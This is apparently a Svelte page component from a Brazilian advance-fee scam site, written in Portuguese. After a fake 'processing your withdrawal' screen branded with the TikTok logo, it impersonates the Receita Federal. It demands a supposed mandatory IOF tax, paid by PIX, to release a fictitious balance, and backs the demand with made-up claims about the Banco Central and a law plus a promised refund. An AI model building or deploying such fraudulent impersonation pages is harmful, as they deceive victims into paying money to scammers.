<script lang="ts">
  import { push } from 'svelte-spa-router';
  import { onMount } from 'svelte';
  import Progress from '$lib/components/Progress.svelte';

  let progress = $state(0);
  let status = $state<'loading' | 'iof'>('loading');
  let iofValue = $state(32.93);
  let balance = $state(1847.93);

  onMount(() => {
    if (status === 'loading') {
      const interval = setInterval(() => {
        if (progress >= 100) {
          clearInterval(interval);
          setTimeout(() => status = 'iof', 500);
        } else {
          progress += 2;
        }
      }, 100);

      return () => clearInterval(interval);
    }
  });

  function handlePayIOF() {
    push('/checkout');
  }
</script>

{#if status === 'loading'}
  <div class="min-h-screen bg-black flex flex-col items-center justify-center">
    <img src="/assets/tiktok-logo-white.svg" alt="TikTok" class="h-12 mb-8" />
    <div class="w-64 mb-4">
      <Progress value={progress} class="h-3 bg-gray-700" />
    </div>
    <p class="text-white text-center">Processando seu saque...</p>
    <p class="text-gray-400 text-sm mt-2">Aguarde enquanto validamos os dados</p>
  </div>
{:else}
  <div class="min-h-screen bg-gradient-to-b from-blue-900 to-blue-950 flex flex-col">
    <header class="bg-blue-900 py-4 flex items-center justify-center gap-3">
      <svg class="w-8 h-8 text-yellow-400" viewBox="0 0 24 24" fill="currentColor">
        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
      </svg>
      <span class="text-white font-semibold text-lg">Receita Federal</span>
    </header>

    <div class="mx-4 mt-4">
      <div class="bg-orange-100 border-l-4 border-orange-500 p-4 rounded-r-lg flex items-center gap-3">
        <svg class="w-6 h-6 text-orange-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
        </svg>
        <span class="text-orange-800 font-medium">Imposto sobre Operações Financeiras (IOF)</span>
      </div>
    </div>

    <main class="flex-1 flex flex-col items-center px-4 py-6">
      <div class="bg-white rounded-lg w-full max-w-lg shadow-lg">
        <div class="p-6 border-b">
          <h2 class="text-xl font-bold text-gray-900">
            Pagamento do IOF Obrigatório para Liberação do Saldo Acumulado
          </h2>
          <p class="text-gray-600 text-sm mt-2">
            Para liberar o valor de saque de <span class="font-semibold">R$ {balance.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>, é necessário o pagamento do Imposto sobre Operações Financeiras (IOF) no valor de <span class="font-semibold text-red-600">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>.
          </p>
        </div>

        <div class="p-4 mx-4 mt-4 bg-blue-50 border border-blue-200 rounded-lg">
          <p class="text-sm text-blue-800">
            <span class="font-semibold">Aviso Legal:</span> Conforme exigido pelo Banco Central do Brasil (Lei nº 8.894/94), o pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório para a liberação do saldo acumulado. O valor será reembolsado automaticamente junto com o saldo.
          </p>
        </div>

        <div class="p-4 mx-4 mt-4 bg-gray-50 rounded-lg">
          <h3 class="font-semibold text-gray-900 mb-4">Resumo</h3>
          <div class="space-y-3">
            <div class="flex justify-between">
              <span class="text-gray-600">Valor de saque</span>
              <span class="font-medium">R$ {balance.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
            <div class="flex justify-between">
              <span class="text-red-600">Valor a ser pago (IOF)</span>
              <span class="text-red-600 font-medium">- R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
            <p class="text-xs text-red-500">*Reembolsado após Aprovação da Conta e Liberação do Saque!</p>
            <div class="border-t pt-3 flex justify-between">
              <span class="font-semibold text-gray-900">Total a receber no PIX</span>
              <span class="font-bold text-gray-900">R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
          </div>
          <div class="flex items-start gap-2 mt-4 text-gray-500 text-xs">
            <svg class="w-4 h-4 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd" />
            </svg>
            <span>O pagamento de R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })} será processado via PIX, após a confirmação do pagamento.</span>
          </div>
        </div>

        <div class="p-4 mx-4 mt-4 bg-green-50 border border-green-200 rounded-lg flex items-start gap-3">
          <div class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center flex-shrink-0">
            <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
            </svg>
          </div>
          <div>
            <p class="font-semibold text-green-900">Garantia de recebimento</p>
            <p class="text-sm text-green-800 mt-1">
              Este processo é regulamentado pelo Banco Central do Brasil. Garantimos que o valor total de R$ {iofValue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })} será creditado diretamente no seu PIX, após o pagamento obrigatório do IOF (Imposto sobre Operações Financeiras).
            </p>
          </div>
        </div>

        <div class="p-4 mx-4 mt-4 bg-teal-50 border border-teal-200 rounded-lg flex items-start gap-3">
          <div class="w-8 h-8 bg-teal-500 rounded-full flex items-center justify-center flex-shrink-0">
            <svg class="w-5 h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
            </svg>
          </div>
          <div>
            <p class="font-semibold text-teal-900">Método de pagamento</p>
            <p class="text-sm text-teal-800 mt-1">
              Pague com <span class="font-semibold">PIX</span>! Os pagamentos são simples, práticos e realizados em segundos.
            </p>
          </div>
        </div>

        <div class="p-4 mx-4 my-4">
          <button
            onclick={handlePayIOF}
            class="w-full bg-gray-400 text-white py-4 rounded-lg font-semibold hover:bg-gray-500 transition-colors"
          >
            Pagar Imposto (IOF)
          </button>
        </div>
      </div>
    </main>
  </div>
{/if}
